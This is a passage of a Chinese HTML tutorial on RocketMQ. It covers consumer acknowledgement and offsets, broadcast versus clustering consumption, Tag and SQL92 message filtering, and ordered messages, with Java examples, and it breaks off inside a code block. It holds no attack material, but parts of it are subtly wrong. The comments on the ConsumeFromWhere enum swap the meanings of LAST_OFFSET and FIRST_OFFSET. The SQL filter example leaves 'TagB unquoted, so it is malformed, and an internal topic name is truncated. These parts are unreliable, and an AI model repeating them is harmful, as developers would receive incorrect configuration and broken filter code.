<h4 data-id="heading-9">2.2 消费者端状态确认机制</h4>
<p>消费者端采用状态确认机制保证消费者⼀定能正常处理对应的消息。消费者的确认机制核心是 <strong>消费偏移量（Offset）的提交</strong> ——Offset 表示消费者消费到队列的哪个位置，Broker 通过 Offset 判断消息是否已被消费。也就是消费者会返回结果给 Broker，Broker等待消费者返回消息处理状态。</p>
<h5 data-id="heading-10">2.2.1 自动确认</h5>
<p>原理：消费线程处理消息时如果<strong>没有抛出异常</strong>，客户端会自动向 Broker 提交 Offset，Broker 标记消息已消费；如果抛出异常，不提交 Offset，Broker 会重试该消息。</p>
<blockquote>
<p>注意：批量消费时，只要有一条消息消费失败，整个批次的 Offset 都不会提交，会重试整个批次。</p>
</blockquote>
<p>代码：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// PushConsumer - 自动确认（默认）</span>
<span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(<span class="hljs-string">"group"</span>);
consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -&gt; {
    <span class="hljs-comment">// 业务处理</span>
    <span class="hljs-keyword">for</span> (MessageExt msg : msgs) {
        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(msg.getBody()));
    }
    <span class="hljs-comment">// 自动返回CONSUME_SUCCESS</span>
    <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
});
</code></pre>
<h5 data-id="heading-11">2.2.2 手动确认</h5>
<p>适用于需要精准控制确认时机的场景（如消息消费后需写入数据库，需确保数据库写入成功再确认）。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 手动确认示例</span>
consumer.registerMessageListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageListenerConcurrently</span>() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ConsumeConcurrentlyStatus <span class="hljs-title function_">consumeMessage</span><span class="hljs-params">(
        List&lt;MessageExt&gt; msgs, 
        ConsumeConcurrentlyContext context
    )</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 业务处理</span>
            processMessages(msgs);
            <span class="hljs-comment">// 手动确认成功</span>
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// 返回失败，稍后重试</span>
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.RECONSUME_LATER;
        }
    }
});
</code></pre>
<h5 data-id="heading-12">2.2.3 确认消息的关键</h5>
<p>这个返回值是⼀个枚举值，有两个选项 CONSUME_SUCCESS 和 RECONSUME_LATER。如果消费者返回 CONSUME_SUCCESS，那么消息自然就处理结束了。但是如果消费者没有处理成功，返回的是 RECONSUME_LATER，Broker 就会过⼀段时间再发起消息重试。</p>
<p>消费状态如下：</p>
<ul>
<li>CONSUME_SUCCESS: 消费成功，消息将被删除</li>
<li>RECONSUME_LATER: 消费失败，稍后重试</li>
</ul>
<p>总的来说就是如下几点</p>
<ul>
<li><strong>重试机制</strong>：未确认的消息会进入重试队列（<code>%RETRY%+消费组名</code>），默认重试 16 次，超过次数进入死信队列（<code>%DLQ%+消费组名</code>）；</li>
<li><strong>Offset 存储</strong>：Broker 将消费组 - 队列的 Offset 存储在内置主题<code>consumerOffse</code>中，即使消费者重启也能恢复消费进度；</li>
<li><strong>顺序消费确认</strong>：顺序消费默认是 “手动确认变种”，通过加锁机制保证消费顺序，只有当前消息确认后才会消费下一条。</li>
</ul>
<h4 data-id="heading-13">2.3 消费者端自行指定消费点</h4>
<p>Broker 端通过 Consumer 返回的状态来推进所属消费者组对应的 Offset。RocketMQ 可以让消费者自行定义，通过设置 ConsumeFromWhere 与 ConsumeTimestamp 来设置消费起始位置。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(<span class="hljs-string">"group"</span>);

<span class="hljs-comment">// 方法1：从指定时间点开始消费</span>
consumer.setConsumeTimestamp(<span class="hljs-string">"20260101000000"</span>); <span class="hljs-comment">// 格式：yyyyMMddHHmmss</span>

<span class="hljs-comment">// 方法2：指定消费起始位置策略</span>
consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET); <span class="hljs-comment">// 从最早开始</span>
consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);   <span class="hljs-comment">// 从最新开始</span>
consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_TIMESTAMP);    <span class="hljs-comment">// 从指定时间开始</span>
</code></pre>
<p>ConsumeFromWhere：消费位置策略枚举</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">ConsumeFromWhere</span> {
    CONSUME_FROM_LAST_OFFSET,      <span class="hljs-comment">// 从队列的第⼀条消息开始重新消费</span>
    CONSUME_FROM_FIRST_OFFSET,     <span class="hljs-comment">// 从上次消费到的地⽅开始继续消费</span>
    CONSUME_FROM_TIMESTAMP         <span class="hljs-comment">// 从某⼀个时间点开始重新消费</span>
}
</code></pre>
<p>如果通过时间点来指定消费，需要指定时间点，这个时间点的格式：<code>yyyyMMddHHmmss</code>。</p>
<h3 data-id="heading-14">3 广播消息</h3>
<p>在 rocketmq 中，主要有两种消息的消费模式，一种是集群消费，另一种是广播消费。</p>
<ol>
<li><strong>集群消费（Clustering）</strong>：默认模式。同一条消息只会被<strong>同一个消费者组（Consumer Group）</strong> 中的<strong>一个</strong>消费者消费。其设计目标是实现负载均衡和高可用，多个消费者共同分担消息处理任务。</li>
<li><strong>广播消费（Broadcasting）</strong>：同一条消息会被<strong>同一个消费者组中的每一个</strong>消费者消费一次。其设计目标是让多个订阅者都接收到完整的消息流。</li>
</ol>
<p>集群模式下，⼀个消息，只会被⼀个消费者组中的多个消费者实例共同处理⼀次。⼴播模式下，⼀个消息，则会推送给所有消费者实例处理，不再关⼼消费者组。</p>
<h4 data-id="heading-15">3.1 简单代码</h4>
<p>JavaAPI 代码</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ！！！关键设置：将消费模式设置为广播模式 ！！！</span>
consumer.setMessageModel(MessageModel.BROADCASTING);
</code></pre>
<p>消息模型枚举有两种，分别是集群和广播</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">MessageModel</span> {
    BROADCASTING(<span class="hljs-string">"BROADCASTING"</span>),
    CLUSTERING(<span class="hljs-string">"CLUSTERING"</span>);
    <span class="hljs-comment">// ....</span>
}
</code></pre>
<blockquote>
<p><strong>实现思路</strong></p>
<p>默认模式(也就是集群模式)下，Broker端会给每个ConsumerGroup维护⼀个统⼀的Offset，这样，当Consumer来拉取消息时，就可以通过Offset保证⼀个消息，在同⼀个ConsumerGroup内只会被消费⼀次。⽽⼴播模式的本质，是将Offset转移到Consumer端⾃⾏保管，包括Offset的记录以及更新，全都放到客户端。这样Broker推送消息时，就不再管ConsumerGroup，只要Consumer来拉取消息，就返回对应的消息。</p>
</blockquote>
<h4 data-id="heading-16">3.2 工作原理</h4>
<p>假设你有一个消费者组 <code>MyConsumerGroup</code>，它下面有三个消费者实例 <code>C1</code>， <code>C2</code>， <code>C3</code>，它们都订阅了主题 <code>MyTopic</code>。</p>
<ul>
<li><strong>在集群模式下</strong>：主题 <code>MyTopic</code> 下的10条消息会以负载均衡的方式（默认为轮询）平均分配给 <code>C1</code>， <code>C2</code>， <code>C3</code> 消费。每个消息只会被其中一个实例消费。</li>
<li><strong>在广播模式下</strong>：主题 <code>MyTopic</code> 下的每一条消息，都会完整地发送给 <code>C1</code>， <code>C2</code>， <code>C3</code> <strong>各一份</strong>。每个消费者实例都会独立消费这10条消息。</li>
</ul>
<pre><code class="hljs language-java" lang="java">集群模式 (负载均衡)        广播模式 (全量复制)
  Msg1 -&gt; [C1]                Msg1 -&gt; [C1]
  Msg2 -&gt; [C2]                Msg2 -&gt; [C1]
  Msg3 -&gt; [C3]      VS        Msg3 -&gt; [C1]
  Msg4 -&gt; [C1]                ... (以此类推，每条消息)
                              Msg1 -&gt; [C2]
                              Msg2 -&gt; [C2]
                              ...
                              Msg1 -&gt; [C3]
                              Msg2 -&gt; [C3]
                              ...
</code></pre>
<h4 data-id="heading-17">3.3 注意事项</h4>
<ol>
<li><strong>消费进度（Offset）管理</strong>：
<ul>
<li><strong>集群模式</strong>：消费进度由Broker端集中存储和管理（新版），所有消费者实例共享同一份进度。如果 <code>C1</code> 消费了 <code>Msg1</code>，整个组就认为 <code>Msg1</code> 已被消费。</li>
<li><strong>广播模式</strong>：<strong>消费进度存储在消费者实例本地</strong>（例如本地文件系统）。每个实例独立维护自己的消费进度，互不影响。<code>C1</code> 消费到哪里，与 <code>C2</code>、<code>C3</code> 完全无关。这意味着如果 <code>C1</code> 实例重启，它会从自己本地的记录开始消费，而不会从其他实例的进度继续。</li>
</ul>
</li>
<li><strong>资源消耗与性能</strong>：
<ul>
<li>广播模式下，网络流量和Broker的负载会成倍增加（与消费者实例数量成正比）。假设有N个实例，每条消息理论上会被传输N次。</li>
<li>每个消费者实例都要处理全量消息，对下游业务系统（如数据库）可能造成重复写入压力，需要业务方自己处理幂等性。</li>
</ul>
</li>
<li><strong>适用场景</strong>：
<ul>
<li><strong>缓存刷新/同步</strong>：多个应用服务器实例需要同时刷新本地缓存（如商品信息变更、配置更新）。</li>
<li><strong>事件通知</strong>：一个事件需要触发所有微服务实例的某个动作（如日志清理、连接重置）。</li>
<li><strong>数据镜像</strong>：多个异地系统需要维护一份相同的数据副本。</li>
</ul>
</li>
<li><strong>不适用场景</strong>：
<ul>
<li><strong>需要负载分担处理大量消息</strong>的场景（如订单处理、日志收集）。此时应使用集群模式。</li>
<li>对消息处理有严格的“只处理一次”要求，且不希望业务层做复杂幂等处理的场景。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-18">4 过滤消息</h3>
<p>RocketMQ 的过滤消息功能允许消费者只接收其感兴趣的消息，而不是订阅主题下的所有消息。这在多种消费者对同一主题有不同关注点的场景下非常有用。</p>
<blockquote>
<p>当我们相同的模块的消息都放到同一个 Topic 中，但是不同的业务需要根据不同的需求去获取不同的消息。例如仓储系统，入库出库消息都是在仓储的 Topic 中，仓储系统需要记账，就根据所需的消息去做进账与出账业务。</p>
</blockquote>
<p>RocketMQ 的消息过滤是在 Broker 端执行的核心机制，核心是通过Tag 标签过滤和SQL92 属性过滤两种方式，让消费者只接收符合条件的消息，减少无效网络传输与消费端压力，过滤在服务端完成，遵循 “匹配即投递” 原则。</p>
<h4 data-id="heading-19">4.1 Tag 过滤</h4>
<p>基于消息的 Tag 标签进行过滤，Tag 是消息的子分类标识，每个消息只能有一个 Tag。</p>
<p><strong>语法规则</strong></p>
<ul>
<li>单 Tag 匹配：如 "CREATE"，只接收标签为 CREATE 的消息。</li>
<li>多 Tag 匹配：多个 Tag 间用 <code>||</code> 分隔（逻辑或），如 "CREATE||PAY||CANCEL"。（不支持模糊匹配）</li>
<li>全匹配：用 <code>*</code> 表示接收该主题下所有消息。</li>
</ul>
<p><strong>实现原理</strong></p>
<ol>
<li>生产者发送消息时，Tag 会被计算哈希值存入 ConsumeQueue（消息消费逻辑队列）。</li>
<li>Broker 过滤时先通过 ConsumeQueue 中的 Tag 哈希值快速匹配，命中后再校验消息原始 Tag 字符串，避免哈希冲突导致误匹配。</li>
<li>消费端拉取到消息后，也会二次校验 Tag 原始值，确保过滤准确性。</li>
</ol>
<p><strong>代码案例</strong></p>
<p>生产者，向 Topic 是 <code>TopicTest</code> 发送 TagA、TagB、TagC 三种标签的消息。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TagFilterProducer</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"TopicTest"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; TAGS = List.of(<span class="hljs-string">"TagA"</span>, <span class="hljs-string">"TagB"</span>, <span class="hljs-string">"TagC"</span>);

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException, InterruptedException {
        <span class="hljs-comment">// 创建消费者，指定消费组</span>
        <span class="hljs-type">DefaultMQProducer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQProducer</span>(PRODUCER_GROUP);
        <span class="hljs-comment">// 设置Nameserver地址</span>
        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// 启动生产者</span>
        producer.start();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 创建消息体：订阅主题、Tag、消息体</span>
                <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC,
                        TAGS.get(i % TAGS.size()),
                        (<span class="hljs-string">"Hello RocketMQ "</span> + i).getBytes(RemotingHelper.DEFAULT_CHARSET)
                );
                <span class="hljs-comment">// 发送消息</span>
                <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.send(msg, <span class="hljs-number">20</span> * <span class="hljs-number">1000</span>);
                System.out.printf(<span class="hljs-string">"%s%n"</span>, sendResult);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                e.printStackTrace();
                Thread.sleep(<span class="hljs-number">1000</span>);
            }
        }
        <span class="hljs-comment">// 关闭生产者，释放资源</span>
        producer.shutdown();
    }
}
</code></pre>
<p><strong>过滤消费者</strong></p>
<p>通过指定 Tag 规则进行过滤。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TagFilterConsumer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONSUMER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"TopicTest"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException {
        <span class="hljs-comment">// 创建消费者，指定消费组</span>
        <span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(CONSUMER_GROUP);
        <span class="hljs-comment">// 设置Nameserver地址</span>
        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// 如果特定的消费群体是全新的，请指定从哪里开始</span>
        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);
        <span class="hljs-comment">// 配置订阅主题Topic、Tag</span>
<span class="hljs-comment">//        consumer.subscribe(TOPIC, "*");</span>
<span class="hljs-comment">//        consumer.subscribe(TOPIC, "TagA");</span>
        consumer.subscribe(TOPIC, <span class="hljs-string">"TagA || TagB"</span>);
        <span class="hljs-comment">// 设置回调函数，处理消息</span>
        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -&gt; {
            System.out.printf(<span class="hljs-string">"%s Receive New Messages: %s %n"</span>, Thread.currentThread().getName(), msg);
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        });
        <span class="hljs-comment">// 启动消费者，启动后会一直挂着，持续处理消息</span>
        consumer.start();
        System.out.printf(<span class="hljs-string">"Consumer Started.%n"</span>);
    }
}
</code></pre>
<p>过滤可以获取全部的消息、指定单个的 Tag 或者指定多个 Tag。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 通配</span>
consumer.subscribe(TOPIC, <span class="hljs-string">"*"</span>);
<span class="hljs-comment">// 单个</span>
consumer.subscribe(TOPIC, <span class="hljs-string">"TagA"</span>);
<span class="hljs-comment">// 多个</span>
consumer.subscribe(TOPIC, <span class="hljs-string">"TagA || TagB"</span>);
</code></pre>
<p><strong>适用场景</strong>：简单的消息分类过滤，如订单创建、支付、取消等不同类型消息的分离，适合高吞吐量场景，性能损耗低。</p>
<h4 data-id="heading-20">4.2 SQL 过滤</h4>
<p>SQL 过滤是基于消息的自定义属性（key-value）进行过滤，支持 SQL92 语法的子集，可实现复杂条件匹配，每个消息可设置多个属性<strong/>。</p>
<p><strong>支持语法元素</strong></p>
<ul>
<li>比较运算符：<code>=</code>、<code>&lt;&gt;</code>、<code>&gt;</code>、<code>&gt;=</code>、<code>&lt;</code>、<code>&lt;=</code>。</li>
<li>逻辑运算符：<code>AND</code>、<code>OR</code>、<code>NOT</code>。</li>
<li>常量：字符串（用单引号）、数字、<code>NULL</code>。</li>
<li>函数：<code>IN</code>、<code>LIKE</code>、<code>BETWEEN</code> 等。</li>
<li>模糊匹配：<code>%</code> 匹配任意 0 个或多个字符， <code>_</code> 匹配任意单个字符  。</li>
</ul>
<p><strong>实现原理</strong>：依赖 rocketmq-filter 模块构建并执行 SQL 表达式，过滤时需读取消息的完整属性进行计算，性能略低于 Tag 过滤，但灵活性更高。</p>
<p>案例代码</p>
<p>生产者还是指定标签 ABC，并且可以自定义写入属性信息。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SQLFilterProducer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SQLTopic"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; TAGS = List.of(<span class="hljs-string">"TagA"</span>, <span class="hljs-string">"TagB"</span>, <span class="hljs-string">"TagC"</span>);

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException, InterruptedException {
        <span class="hljs-comment">// 创建消费者，指定消费组</span>
        <span class="hljs-type">DefaultMQProducer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQProducer</span>(PRODUCER_GROUP);
        <span class="hljs-comment">// 设置Nameserver地址</span>
        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// 启动生产者</span>
        producer.start();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 创建消息体：订阅主题、Tag、消息体</span>
                <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC,
                        TAGS.get(i % TAGS.size()),
                        (<span class="hljs-string">"Hello RocketMQ "</span> + i).getBytes(RemotingHelper.DEFAULT_CHARSET)
                );
                <span class="hljs-comment">// 生产者发送带自定义属性的消息</span>
                msg.putUserProperty(<span class="hljs-string">"orderId"</span>, <span class="hljs-string">"123456"</span>);
                msg.putUserProperty(<span class="hljs-string">"qty"</span>, String.valueOf(<span class="hljs-number">10</span> + i));
                <span class="hljs-comment">// 发送消息</span>
                <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.send(msg, <span class="hljs-number">20</span> * <span class="hljs-number">1000</span>);
                System.out.printf(<span class="hljs-string">"%s%n"</span>, sendResult);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                e.printStackTrace();
                Thread.sleep(<span class="hljs-number">1000</span>);
            }
        }
        <span class="hljs-comment">// 关闭生产者，释放资源</span>
        producer.shutdown();
    }
}
</code></pre>
<p>消费者通过 SQL 进行过滤</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SQLFilterConsumer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONSUMER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SQLTopic"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException {
        <span class="hljs-comment">// 创建消费者，指定消费组</span>
        <span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(CONSUMER_GROUP);
        <span class="hljs-comment">// 设置Nameserver地址</span>
        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// 如果特定的消费群体是全新的，请指定从哪里开始</span>
        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);
        <span class="hljs-comment">// 配置订阅主题Topic、SQL</span>
        consumer.subscribe(TOPIC,
                MessageSelector.bySql(<span class="hljs-string">"(TAGS IS NOT NULL AND TAGS IN ('TagA', 'TagB)) "</span> +
                        <span class="hljs-string">"AND (orderId IS NOT NULL AND qty &gt; 15)"</span>));
        <span class="hljs-comment">// 设置回调函数，处理消息</span>
        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -&gt; {
            System.out.printf(<span class="hljs-string">"%s Receive New Messages: %s %n"</span>, Thread.currentThread().getName(), msg);
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        });
        <span class="hljs-comment">// 启动消费者，启动后会一直挂着，持续处理消息</span>
        consumer.start();
        System.out.printf(<span class="hljs-string">"Consumer Started.%n"</span>);
    }
}
</code></pre>
<p>过滤出标签是 TagA 和 TagB 以及 qty 大于 15 并且 orderId 不能为空。</p>
<p><strong>适用场景</strong>：复杂业务过滤，如根据订单金额、时间范围、用户等级等多维度筛选消息。</p>
<blockquote>
<p>注：通过 TAGS 过滤是不用担心性能问题，但是通过自定义属性就会造成性能问题。 RocketMQ 中被过滤掉的消息不会消失，过滤只是限制这些消息投递给当前匹配过滤条件的消费者，消息本身的生命周期完全由 Broker 的存储策略决定，和是否被过滤没有关系。</p>
<p>由于模糊匹配（特别是 %xxx 这种前置通配符）会导致 Broker 无法利用索引，必须逐条扫描消息属性，在消息量巨大时会严重影响性能。如果可能，建议在发送消息时将需要模糊匹配的维度拆分为独立的消息属性（例如将 orderType 拆分为 prefix 和 suffix 两个属性），或者直接使用 Tag 进行粗粒度过滤，再在消费端进行细粒度的模糊匹配。</p>
</blockquote>
<h3 data-id="heading-21">5 顺序消息</h3>
<p>RocketMQ 的顺序消息（FIFO 消息）是一种**高级消息类型<strong>，支持消费者按照发送消息的先后顺序获取消息，从而实现业务场景中的顺序处理。它通过</strong>消息组 (MessageGroup)** 机制保证<strong>局部顺序</strong>，在满足业务顺序需求的同时兼顾系统吞吐能力。</p>
<h4 data-id="heading-22">生产端：保证发送顺序</h4>
<ul>
<li><strong>队列选择器</strong>：通过<code>MessageQueueSelector</code>将同一业务标识（如订单 ID）的消息路由到<strong>同一个队列</strong>，避免跨队列乱序</li>
<li><strong>同步发送</strong>：必须使用<strong>同步发送</strong>（<code>send()</code>），禁止异步发送，确保消息发送成功后再发送下一条</li>
<li><strong>消息组机制</strong>：新版 RocketMQ 通过<code>MessageGroup</code>属性标记消息归属，服务端自动路由到对应队列。</li>
</ul>
<blockquote>
<p>⽣产者只有将⼀批有顺序要求的消息，放到同⼀个MesasgeQueue上，通过MessageQueue的FIFO特性保证这⼀批消息的顺序。如果不指定MessageSelector对象，那么⽣产者会采⽤轮询的⽅式将多条消息依次发送到不同的MessageQueue上。</p>
</blockquote>
<p>生产者案例代码</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 生产者发送顺序消息</span>
producer.send(message, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageQueueSelector</span>() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> MessageQueue <span class="hljs-title function_">select</span><span class="hljs-params">(List&lt;MessageQueue&gt; mqs, Message msg, Object arg)</span> {
        <span class="hljs-comment">// 按订单ID哈希选择队列，确保同一订单消息进入同一队列</span>
        <span class="hljs-type">Integer</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> (Integer) arg;
        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> orderId % mqs.size();
        <span class="hljs-keyword">return</span> mqs.get(index);
    }
}, orderId); <span class="hljs-comment">// 传递订单ID作为路由参数</span>
</code></pre>
<h4 data-id="heading-23">消费端：保证处理顺序</h4>
<ul>
<li><strong>顺序消费模式</strong>：使用<code>MessageListenerOrderly</code>（而非并发模式<code>MessageListenerConcurrently</code>）</li>
<li><strong>队列独占</strong>：同一队列同一时间仅分配给<strong>一个消费线程</strong>，线程按消息顺序串行处理</li>
<li><strong>队列锁机制</strong>：消费端通过<code>ConsumeOrderlyContext</code>自动加锁，防止同一队列被多线程并发消费。</li>
</ul>
<blockquote>
<p>消费者需要实现MessageListenerOrderly接⼝，实际上在服务端，处理MessageListenerOrderly时，会给⼀个MessageQueue加锁，拿到 MessageQueue上所有的消息，然后再去读取下⼀个MessageQueue的消息。</p>
</blockquote>
<p>消费者案例代码</p>
<pre><code class="hljs language-java" lang="java">consumer.registerMessageListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageListenerOrderly</span>() {
    <span class="hljs-type">AtomicLong</span> <span class="hljs-variable">consumeTimes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLong</span>(<span class="hljs-number">0</span>);
    <span class="hljs-meta">@Override</span>
